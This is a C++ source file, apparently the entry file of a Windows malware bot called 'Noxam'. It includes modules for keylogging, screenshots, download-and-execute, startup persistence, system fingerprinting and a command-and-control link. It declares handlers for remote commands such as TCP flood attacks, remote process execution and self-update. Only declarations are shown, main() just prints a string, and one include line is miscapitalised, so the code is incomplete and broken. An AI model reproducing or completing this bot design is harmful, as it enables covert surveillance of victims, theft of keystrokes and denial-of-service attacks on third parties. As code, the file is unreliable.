#include <iostream>
#include <string>
#include <stdio.h>
#include <VersionHelpers.h>
#include <windows.h>
#Include <WinBase.h>

#include "Headers/Net/NoxamHTTP.hxx"
#include "Headers/NoxamAgressiveOptimize.hxx"
#include "Headers/Utils/NoxamGate.hxx"
#include "Headers/Net/NoxamNetINIT.hxx"
#include "Headers/Crypto/NoxamWebSafeEncryption.hxx"
#include "Headers/Crypto/NoxamStringOprations.hxx"
#include "Headers/Crypto/NoxamURLEncoding.hxx"
#include "Headers/Config/NoxamCommand.hxx"
#include "Headers/SystemX/NoxamWebSiteChecker.hxx"
#include "Headers/SystemX/NoxamOSVersionChecker.hxx"
#include "Headers/SystemX/NoxamOSHWidChecker.hxx"
#include "Headers/SystemX/NoxamOSCPUChecker.hxx"
#include "Headers/SystemX/NoxamOSGPUChecker.hxx"
#include "Headers/SystemX/NoxamOSNetVersionChecker.hxx"
#include "Headers/CNC/NoxamPELSAdmin.hxx"
#include "Headers/SystemX/NoxamOSGetRAM.hxx"
#include "Headers/Utils/NoxamGateHelper.hxx"
#include "Headers/Utils/NoxamKeyLogger.hxx"
#include "Headers/Attack/NoxamAttackFlood.hxx"
#include "Headers/Utils/NoxamProccess.hxx"
#include "Headers/Utils/NoxamDownloadExecute.hxx"
#include "Headers/Utils/NoxamScreenshot.hxx"
#include "Headers/NoxamStartUp.hxx"

using namespace std;


void NoxamRunEvents();
int NoxamGetEventsIndex(NoxamPostPollDelegate Nproc);
bool NoxamAddEvent(NoxamPostPollDelegate Nproc);
bool NoxamRemoveEvent(NoxamPostPollDelegate Nproc);
void NoxamKeyLogFlushEvent();
void NoxamKeyLogParser(int NxmCommand, int NxmCommandType, char* NxmData);
void NoxamRemoteProccessParser(int NxmCommandID, int NxmCommandType, char* NxmData);

DWORD __stdcall NoxamTCPThreadStart(PVOID NxmData);

void NoxamTCOFloodParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamRemoteProccessNoResultParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamJoinParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamPollParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamSiteCheckerParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamDownloadAndUpdate(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamDownloadExecuParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamMessageBoxParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamScreenShotParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamInitializeParser();
char* NoxamGetInitializeJoinCommand();
void NoxamInitializePollThread();
int WINAPI NoxamWinMain(HINSTANCE NxmIn, HINSTANCE NxmPrev, LPSTR NxmCmd, int NxmShow);



int main()
{
    std::cout << "Bang Bang" << std::endl;
    return 0;
}
